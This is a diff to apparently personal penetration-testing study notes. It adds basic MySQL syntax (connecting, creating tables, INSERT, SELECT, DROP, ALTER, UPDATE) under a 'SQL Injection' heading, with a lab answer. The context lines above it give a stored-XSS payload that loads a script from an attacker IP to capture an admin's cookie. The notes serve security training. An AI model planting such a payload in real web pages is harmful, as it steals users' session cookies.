@@ -430,3 +430,81 @@ if (isset($_GET['c'])) {
 3. use this payload in the vulnerable parameter `'><script src=http://10.10.15.62/script.js></script>` then in the terminal we will receive an cookie of the admin
 4. we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:
 `DOM.innerHTML, DOM.outerHTML, document.write(), document.writeln(), document.domain`
+
+
+## SQL Injection
+Command Line
+
+TIP:
+Every Query Should Be End with ; (semicolumn)
+
+***MySQL***
+`mysql -u root -p` # By using this command we will get an option to put password
+`mysql -u root -p<password>` # for directly entering in Mysql dbms without storing it anywhere/cleartext/logs/terminal History
+`mysql -u root -h docker.hackthebox.eu -P 3306 -p`  # in this command -P is for port and -h for defining the host
+
+*creating a database*
+`CREATE DATABASE users;` # creating users database in MySQL 
+`SHOW DATABASES;` # for listing out all the databases
+`USE users;` # we can switch the database using this command (users is a database) 
+`CREATE TABLE logins ( id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME );` # this query will create an login table (do AI For more)
+`SHOW TABELS;` # list out all the tables inside the databases
+`DESCRIBE logines;` # used to list the table structure with its fields and data types. (logines is a table name FYI)
+
+*Table Properties*
+
+AUTO_INCREMENT → The id number goes up by 1 automatically for each new row.
+NOT NULL → This column cannot be left empty (it’s required).
+UNIQUE → No two rows can have the same value in this column (e.g., no duplicate usernames).
+DEFAULT NOW() → If you don’t enter a date, it automatically uses the current date & time.
+PRIMARY KEY (id) → The id column becomes the unique identifier for each row.
+
+### command for connecting mysql server on diff host 
+mysql -h 154.57.164.65 -P 32755 -u root -ppassword --skip-ssl-verify-server-cert # --skip-ssl-verify-server-cert for skipping the ssl/tls -h for hostname/IP
+
+#### Insert Statement in MySQL
+
+`INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);` # used to add a new record to the table
+`mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');` # we are inserting some data into the login tables
+
+
+`INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);` # rules like how to write a statement below is the actual example
+`INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');` # updating specific columns in this case username and password (logins is that table name)
+`mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');` # We can also add multiple recodes at once by seprating them with a comma
+
+#### Select Statment
+`SELECT * FROM table_name;` # the genral syntaxt to view entire table
+`SELECT column1, column2 FROM table_name;` # we can view data present in specific columns as well
+
+
+#### Drop statement
+Basically we can use this to remove tables and databases from server
+`DROP TABLE logins;` # for removing the table called logins from the database
+
+#### Alter statement
+We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. 
+
+`ALTER TABLE logins ADD newColumn INT;` # this adds a new column newColumn to the logins table using ADD
+`mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;` # To rename a column, we can use RENAME COLUMN
+`mysql> ALTER TABLE logins MODIFY newerColumn DATE;` # We can also change a column's datatype with MODIFY
+`ALTER TABLE logins DROP newerColumn;` # we can also drop an coulmn from a table using a Drop with alter statement
+
+#### Update Statement
+UPDATE statement can be used to update specific records within a table, based on certain conditions.
+
+`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;` # general syntax 
+`mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;` # We specify the table name, each column and its new value, and the condition for updating records. The query above updated all passwords in all records where the id was more significant than 1.
+
+Ans for the lab:
+mysql -h 154.57.164.65 -P 32755 -u root -ppassword --skip-ssl-verify-server-cert # first authenticated 
+SHOW DATABASES; # list databases
+USE employees; # use the database which we want in this case employees
+show tables; # list out tables from the database
+SELECT * FROM developement # view all the info from the developement table
+
+
+
+
+
+
+
